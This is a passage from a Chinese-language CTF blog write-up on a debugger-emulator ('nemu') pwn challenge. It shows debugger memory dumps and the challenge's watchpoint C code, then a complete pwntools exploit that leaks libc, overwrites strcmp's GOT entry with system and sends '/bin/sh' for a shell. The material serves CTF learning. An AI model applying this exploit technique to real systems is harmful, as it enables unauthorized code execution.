</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d  %-18s %#x               %#x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">head2</span><span class="o">-&gt;</span><span class="n">NO</span><span class="p">,</span><span class="n">head2</span><span class="o">-&gt;</span><span class="n">exp</span><span class="p">,</span><span class="n">head2</span><span class="o">-&gt;</span><span class="n">old_val</span><span class="p">,</span><span class="n">head2</span><span class="o">-&gt;</span><span class="n">new_val</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">head2</span> <span class="o">=</span> <span class="n">head2</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; p &amp;head
</span></span><span class="line"><span class="cl">$7 = (WP **) 0x86a3fc8 &lt;head&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">pwndbg&gt; x/8gx 0x60f018-0x20
</span></span><span class="line"><span class="cl">0x60eff8:       0x0000000000000000      0x000000000060ee18
</span></span><span class="line"><span class="cl">0x60f008:       0x00007d7a583572e0      0x00007d7a583332f0
</span></span><span class="line"><span class="cl">0x60f018 &lt;__snprintf_chk@got.plt&gt;:      0x00007d7a58137d30      0x00007d7a580add30
</span></span><span class="line"><span class="cl">0x60f028 &lt;putchar@got[plt]&gt;:    0x0000000000401506      0x0000000000401516
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里要让libc地址位于head+0x30处，就能通过old_val  new_val泄露出libc地址</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1">#pwndbg&gt; p/x 0x86a3fc8-0x6a3b80</span>
</span></span><span class="line"><span class="cl"><span class="c1">#$1 = 0x8000448</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;set 0x8000448 0x60eff0&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># dbg()</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;info w&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;New Value&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0x&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_low</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0x&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_high</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;libc_high&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;libc_low&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="p">(</span><span class="n">libc_high</span><span class="o">&lt;&lt;</span><span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="n">libc_low</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;libc_base&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>写入system：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">WP</span> <span class="o">*</span><span class="nf">new_wp</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">free_</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">assert</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//unlink
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">WP</span> <span class="o">*</span><span class="n">temp</span> <span class="o">=</span> <span class="n">free_</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">free_</span> <span class="o">=</span> <span class="n">free_</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//insert
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">temp</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">temp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">set_watchpoint</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">bool</span> <span class="n">flag</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint32_t</span> <span class="n">val</span> <span class="o">=</span> <span class="nf">expr</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">flag</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">flag</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;You input an invalid expression, failed to create watchpoint!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">WP</span> <span class="o">*</span><span class="n">wp</span> <span class="o">=</span> <span class="nf">new_wp</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="n">wp</span><span class="o">-&gt;</span><span class="n">old_val</span> <span class="o">=</span> <span class="n">val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memcpy</span><span class="p">(</span><span class="n">wp</span><span class="o">-&gt;</span><span class="n">exp</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="c1">//...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里可以看到：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">WP *wp = free_;
</span></span><span class="line"><span class="cl">memcpy(wp-&gt;exp, args, 30);
</span></span></code></pre></td></tr></table>
</div>
</div><p>也就是<code>w 0xdeedbeef</code>的时候，会把<code>0xdeedbeef</code>写入<code>free_+0x30</code>处</p>
<p>这样我们只需要去set free_再w就能实现任意写</p>
<p>这里的思路是写strcmp的got为system，在<code>ui_mainloop</code>中,strcmp的第一个参数就是我们输入的命令，输入binsh就行</p>
<p>exp:</p>
<p>这里我用的本地的libc</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;splitw&#34;</span><span class="p">,</span> <span class="s2">&#34;-h&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">address</span> <span class="o">=</span> <span class="s1">&#39;./pwn&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># address = &#39;./pwn_patched&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#-----------------------------------------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ss</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span>  <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="c1"># lg      = lambda s,addr		        : log.info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s,addr))</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>			        <span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">l64</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">l32</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\xf7</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">r64</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">ir64</span>    <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#-----------------------------------------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> \
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    
</span></span></span><span class="line"><span class="cl"><span class="s2">    c
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;r&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;host.docker.internal&#34;</span><span class="p">,</span><span class="mi">9999</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;d&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">gdbscript</span> <span class="o">=</span> <span class="n">gdbscript</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># gdb.attach(p, gdbscript=gdbscript)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># pause()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;(nemu) &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># dbg()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#pwndbg&gt; p/x 0x86a3fc8-0x6a3b80</span>
</span></span><span class="line"><span class="cl"><span class="c1">#$1 = 0x8000448</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;set 0x8000448 0x60eff0&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;info w&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;New Value&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0x&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_low</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0x&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_high</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;libc_high&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;libc_low&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="p">(</span><span class="n">libc_high</span><span class="o">&lt;&lt;</span><span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="n">libc_low</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">-</span><span class="mh">0xadd30</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;libc_base&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;set 0x8000448 0&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># dbg()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x58750</span>
</span></span><span class="line"><span class="cl"><span class="n">strcmp_got</span> <span class="o">=</span> <span class="mh">0x60F0F0</span>
</span></span><span class="line"><span class="cl"><span class="c1"># pwndbg&gt; p &amp;free_</span>
</span></span><span class="line"><span class="cl"><span class="c1"># $1 = (WP **) 0x86a3fc0 &lt;free_&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># pwndbg&gt; p/x 0x86a3fc0 - 0x6a3b80</span>
</span></span><span class="line"><span class="cl"><span class="c1"># $2 = 0x8000440</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;set 0x8000440 0x60f0c0&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;w &#39;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 0x6a3b80</span>
</span></span><span class="line"><span class="cl"><span class="n">itr</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="c1"># x/8gx 0x60f018-0x20</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>做下来，有别于传统的题，又挺有意思的一道题</p>
</blockquote></div>

        <div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2025-10-23</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share"></div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/cpp_pwn/" class="prev" rel="prev" title="C&#43;&#43;pwn"><i class="fas fa-angle-left fa-fw"></i>C&#43;&#43;pwn</a>
            <a href="/posts/read_rsdzh/" class="next" rel="next" title="【阅读】人生的智慧">【阅读】人生的智慧<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
            </noscript></div></article></div>
        </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">
                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.122.0">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
            <div class="footer-line"></div>
            <div class="footer-line">
            </div>
        </div></footer></div>

    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
            <i class="fas fa-arrow-up fa-fw"></i>
        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
            <i class="fas fa-comment fa-fw"></i>
        </a>
